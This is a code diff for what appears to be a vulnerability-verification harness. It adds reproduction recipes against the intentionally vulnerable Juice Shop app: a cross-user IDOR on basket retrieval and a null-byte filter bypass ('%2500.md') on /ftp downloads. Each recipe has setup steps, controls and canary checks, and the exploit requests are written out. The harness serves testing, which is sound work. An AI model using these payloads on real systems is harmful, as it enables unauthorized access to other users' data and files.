@@ -239,6 +239,198 @@ function loginBypassRecipe(config: JuiceShopConfig): ReproductionRecipe {
   };
 }
 
+const PRODUCTS_API_PATH = "/api/Products";
+const BASKET_ITEMS_API_PATH = "/api/BasketItems";
+const BASKET_REST_PATH = "/rest/basket";
+
+/**
+ * Extracts `authentication.bid` as a string from `POST /rest/user/login`. `routes/login.ts` calls
+ * `BasketModel.findOrCreate({ where: { UserId } })` on login and returns the user's basket id under
+ * `authentication.bid`.
+ */
+function extractBasketId(response: ReproductionProbeResult): string | undefined {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(response.body);
+  } catch {
+    return undefined;
+  }
+  if (typeof parsed !== "object" || parsed === null) return undefined;
+  const authentication = (parsed as Record<string, unknown>).authentication;
+  if (typeof authentication !== "object" || authentication === null) return undefined;
+  const bid = (authentication as Record<string, unknown>).bid;
+  if (typeof bid === "number" && Number.isInteger(bid) && bid > 0) return String(bid);
+  if (typeof bid === "string" && bid.length > 0) return bid;
+  return undefined;
+}
+
+/**
+ * `GET /rest/basket/:id` returns `{ status: "success", data: { id, Products: [...] } }`.
+ * Checking `Products[].description` specifically (rather than a raw substring match on the body)
+ * proves that the response returned the basket containing the canary-tagged item seeded for
+ * principal B, while principal A's own empty basket returns `Products: []`.
+ */
+function canaryInBasketProducts(body: string, canary: string): boolean {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(body);
+  } catch {
+    return false;
+  }
+  if (typeof parsed !== "object" || parsed === null) return false;
+  const data = (parsed as { data?: unknown }).data;
+  if (typeof data !== "object" || data === null) return false;
+  const products = (data as Record<string, unknown>).Products;
+  if (!Array.isArray(products)) return false;
+  return products.some((product) => {
+    if (typeof product !== "object" || product === null) return false;
+    const description = (product as Record<string, unknown>).description;
+    return typeof description === "string" && description.includes(canary);
+  });
+}
+
+/**
+ * Two-identity IDOR on `GET /rest/basket/:id` (routes/basket.ts). The route is behind
+ * `security.isAuthorized()`, which checks that a valid JWT is present, and `retrieveBasket()`
+ * fetches `BasketModel.findOne({ where: { id: req.params.id }, include: [Products] })` without
+ * checking whether the basket belongs to the authenticated caller.
+ *
+ * The fixture registers principal B (`{{canary}}`). Setup logs in as B (capturing `victimToken` and
+ * `victimBasketId`), updates Product 1's description to `{{canary}}` via unauthenticated
+ * `PUT /api/Products/1` (`changeProductChallenge` leaves `PUT /api/Products/:id` open in finale),
+ * adds Product 1 to B's basket via `POST /api/BasketItems`, and then registers and logs in a second
+ * principal A (`second-{{canary}}`, capturing `attackerToken` and `attackerBasketId`). The negative
+ * control has A read A's own basket (`attackerBasketId`), which is empty and does not contain the
+ * canary; the exploit has A read B's basket (`victimBasketId`) using A's own Bearer token, which
+ * discloses B's canary-tagged basket item.
+ */
+function idorBasketRecipe(config: JuiceShopConfig): ReproductionRecipe {
+  const secondPrincipalEmail = `second-${CANARY_PLACEHOLDER}`;
+  return {
+    id: "juice-shop-idor-basket",
+    title: "IDOR on shopping basket retrieval across principals",
+    keywords: ["idor", "insecure direct object reference", "broken access control", "basket", BASKET_REST_PATH],
+    fixture: registrationFixture(config),
+    setup: [
+      {
+        request: {
+          method: "POST",
+          path: LOGIN_PATH,
+          body: { email: CANARY_PLACEHOLDER, password: FIXTURE_PASSWORD },
+        },
+        capture: {
+          victimToken: extractAuthToken,
+          victimBasketId: extractBasketId,
+        },
+      },
+      {
+        request: {
+          method: "PUT",
+          path: `${PRODUCTS_API_PATH}/1`,
+          body: {
+            description: CANARY_PLACEHOLDER,
+          },
+        },
+      },
+      {
+        request: {
+          method: "POST",
+          path: BASKET_ITEMS_API_PATH,
+          headers: { Authorization: "Bearer {{victimToken}}" },
+          body: {
+            ProductId: 1,
+            BasketId: "{{victimBasketId}}",
+            quantity: 1,
+          },
+        },
+      },
+      {
+        request: {
+          method: "POST",
+          path: config.canaryRegistrationPath,
+          body: {
+            email: secondPrincipalEmail,
+            password: FIXTURE_PASSWORD,
+            passwordRepeat: FIXTURE_PASSWORD,
+          },
+        },
+      },
+      {
+        request: {
+          method: "POST",
+          path: LOGIN_PATH,
+          body: { email: secondPrincipalEmail, password: FIXTURE_PASSWORD },
+        },
+        capture: {
+          attackerToken: extractAuthToken,
+          attackerBasketId: extractBasketId,
+        },
+      },
+    ],
+    negativeControl: {
+      method: "GET",
+      path: `${BASKET_REST_PATH}/{{attackerBasketId}}`,
+      headers: { Authorization: "Bearer {{attackerToken}}" },
+    },
+    exploit: {
+      method: "GET",
+      path: `${BASKET_REST_PATH}/{{victimBasketId}}`,
+      headers: { Authorization: "Bearer {{attackerToken}}" },
+    },
+    oracleCheck: (response, canary) =>
+      response.status === 200 && canaryInBasketProducts(response.body, canary),
+  };
+}
+
+const FTP_PATH = "/ftp";
+const FTP_BACKUP_FILE = "package.json.bak";
+
+/**
+ * `GET /ftp/package.json.bak%2500.md` bypasses `endsWithAllowlistedFileType` in
+ * `routes/fileServer.ts` (which allows only `.md` and `.pdf`) because `cutOffPoisonNullByte`
+ * truncates at `%00` after the extension check, so `res.sendFile(path.resolve('ftp/', file))`
+ * serves `ftp/package.json.bak`. Parsing the returned JSON and checking both `"name": "juice-shop"`
+ * and `"version"` confirms the backup file content was disclosed rather than a generic 200 page or
+ * the public `legal.md` control.
+ */
+function isBackupPackageJson(body: string): boolean {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(body);
+  } catch {
+    return false;
+  }
+  if (typeof parsed !== "object" || parsed === null) return false;
+  const pkg = parsed as Record<string, unknown>;
+  return pkg.name === "juice-shop" && typeof pkg.version === "string" && pkg.version.length > 0;
+}
+
+function ftpPoisonNullByteRecipe(config: JuiceShopConfig): ReproductionRecipe {
+  return {
+    id: "juice-shop-ftp-poison-null-byte",
+    title: "Poison null-byte filter bypass on /ftp file download",
+    keywords: [
+      "path traversal",
+      "poison null byte",
+      "null byte",
+      "file disclosure",
+      FTP_BACKUP_FILE,
+      "coupons_2013.md.bak",
+      FTP_PATH,
+    ],
+    fixture: registrationFixture(config),
+    negativeControl: {
+      method: "GET",
+      path: `${FTP_PATH}/legal.md`,
+    },
+    exploit: {
+      method: "GET",
+      path: `${FTP_PATH}/${FTP_BACKUP_FILE}%2500.md`,
+    },
+    oracleCheck: (response) => response.status === 200 && isBackupPackageJson(response.body),
+  };
+}
+
 /**
  * Juice Shop's search view renders the `q` route parameter into the page with
  * `bypassSecurityTrustHtml` and an `[innerHTML]` binding (the localXssChallenge), so a payload in
@@ -284,7 +476,13 @@ function domXssSearchRecipe(): ReproductionRecipe {
 export const getRecipesForTarget: GetRecipesForTargetFn = (target) => {
   if (target.name === "juice-shop-v17.3.0") {
     if (!isJuiceShopConfig(target.config)) return [];
-    return [sqliSearchRecipe(target.config), loginBypassRecipe(target.config), domXssSearchRecipe()];
+    return [
+      sqliSearchRecipe(target.config),
+      loginBypassRecipe(target.config),
+      idorBasketRecipe(target.config),
+      ftpPoisonNullByteRecipe(target.config),
+      domXssSearchRecipe(),
+    ];
   }
   // Every other onboarding target dispatches through its own module, so juice-shop's frozen
   // recipes above stay untouched. See lib/targets/recipes.additional.ts.
